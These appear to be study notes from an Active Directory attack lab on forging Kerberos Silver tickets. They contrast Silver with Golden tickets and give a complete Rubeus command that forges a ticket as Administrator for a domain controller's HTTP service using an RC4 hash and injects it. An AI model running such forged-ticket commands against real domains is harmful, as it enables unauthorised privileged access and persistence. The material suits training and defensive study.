* A valid Service Ticket or TGS ticket (Golden ticket is TGT).
* Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
* Services rarely check PAC (Privileged Attribute Certificate).
* Services will allow access only to the services themselves.
*  Reasonable persistence period (default 30 days for computer accounts).

*  Forge a Silver ticket. :
```
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-37263689483917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```
*  Just like the Golden ticket, /ldap option queries DC for information related to the user.
* Similar command can be used for any other service on a machine.
  Which services? HOST, RPCSS, CIFS and many more.

